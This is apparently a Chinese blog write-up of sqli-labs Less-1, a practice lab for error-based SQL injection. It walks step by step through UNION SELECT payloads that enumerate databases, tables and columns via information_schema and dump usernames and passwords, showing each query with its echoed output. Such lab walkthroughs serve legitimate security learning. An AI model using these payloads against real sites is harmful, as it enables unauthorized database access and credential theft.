---
title: sqli_lib之less1
toc: true
description: "和 webug 之显错注入一样, 这也是一个 sql 显错注入. 作为最基本的 sql 注入入门, 你需要通过显错注入学到注入的基本思想、步骤以及技术基础。"
summary: "和 webug 之显错注入一样, 这也是一个 sql 显错注入. 作为最基本的 sql 注入入门, 你需要通过显错注入学到注入的基本思想、步骤以及技术基础。"
categories:
    - websec
    - sql injection
date: 2019-07-25 15:38:01
tags:
---

虽然有 mysql 注入天书，但是总感觉自己总结一下，学得会更扎实，写给自己看吧。下面解释并不多，主要是记录流程以及 payload。对你来说，你应该自己亲手敲出这些 payload，并且清楚地理解其含义，学会举一反三。

## 检测注入点

在 id=1 后面加一个英文引号，即：?id=1'

报错：....the right syntax to use near ''1'' LIMIT 0,1' at line 1

这里注意 near 后面最外围的引号是报错语句将 sql 语句引起来用的，所以真实的 sql 语句是：'1'' LIMIT 0,1

由此可知

1. 字符型注入，即：php 源码写的是 where id=‘\$id’
2. where 查询后面还有个 limit 一会儿加个注释，注释掉他。

## 猜字段数

?id=-1' order by 3 --+
结果为三个字段，即：此查询语句查询了三个字段。

## 注入相关信息

注意：这里 id = -1' ，将 1 改成-1 是为了让前面查询不到结果，这样查询结果只有我们写的 union 查询后面查询出的结果了。

数据库，系统版本及当前数据库名, 当前登录用户，mysql 数据库的路径等

```php
?id=-1' union select 1,concat_ws(' , ', version(), database(), user(), @@datadir, @@version_compile_os),3 --+
```

回显:
5.5.53 , security , root@localhost , C:\phpStudy\MySQL\data\ , Win32

这里我们知道了，数据库版本：5.5.53，当前数据库的名字 security，当前用户：root，mysql 数据库的路径： C:\phpStudy\MySQL\data\，系统版本：Win32

## 爆数据库名

```php
?id=-1' union select 1,group_concat(distinct schema_name), 3 from information_schema.schemata --+
```

回显: Your Login name:information_schema,challenges,mysql,performance_schema,security,webug,webug_sys,webug_width_byte

这里简单介绍一下，information_schema 中的 schemata 表，存储着 mysql 中所有数据库的数据。包括表名：schema_name，字符集等。

爆数据库名，正规的话就用，information_schema 中的 schemata 表

当然，不正规的方法也有，可以使用 information_schema 中的 tables 表 或者 columns 表。

因为 tables 存储着 table_schema 即每张表位于的数据库，这样又会有很多重复的，所以使用 group_concat(distinct 字段名) 去除重复的，并将其组合成一个以逗号分隔的字符串。

```php
?id=-1' union select 1,group_concat(distinct table_schema), 3 from information_schema.tables --+
```

columns 表也是类似

```php
?id=-1' union select 1,group_concat(distinct table_schema), 3 from information_schema.columns --+
```

## 爆表

列出 security 数据库中的表

```php
?id=-1' union select 1,group_concat(distinct table_name), 3 from information_schema.tables where table_schema='security' --+
```

回显: Your Login name:emails,referers,uagents,users

爆表一般就用 informtion_schema 中的 tables 列，当然你像上面爆库的时候，使用 columns 表中的 table_name 字段和 group_concat(distinct 字段名)

回显：Your Login name:emails,referers,uagents,users

## 爆列

列出 securtiy 库的 users 表中的列名

```php
?id=-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_schema='security' and table_name='users' --+
```

回显：Your Login name:id,username,password

学到了注入列名的方法，在 columns 表中使用 where 语句查询某个数据库下的某个表的字段名，字段名肯定是不会重复的，所以 group_concat 不用使用 distinct。

## 爆 users 的数据

```php
?id=-1' union select 1,concat_ws(' , ', username, password), 3 from security.users --+
```

回显：Your Login name:Dumb , Dumb

## 总结回顾：

1. 学到了如何注入列名，可以对 webug 显错注入的流程进行改进。
2. 需要系统地学习并总结一下 mysql 的系统数据库，尤其是 information_schema 中的表，并来一篇笔记
3. 对注入流程更加清晰了，再把 sql 注入介绍那篇博文加上 sql 注入流程。

推荐文章：

[你真的会 SQL 注入攻击吗？（下）](https://zhuanlan.zhihu.com/p/22397620)
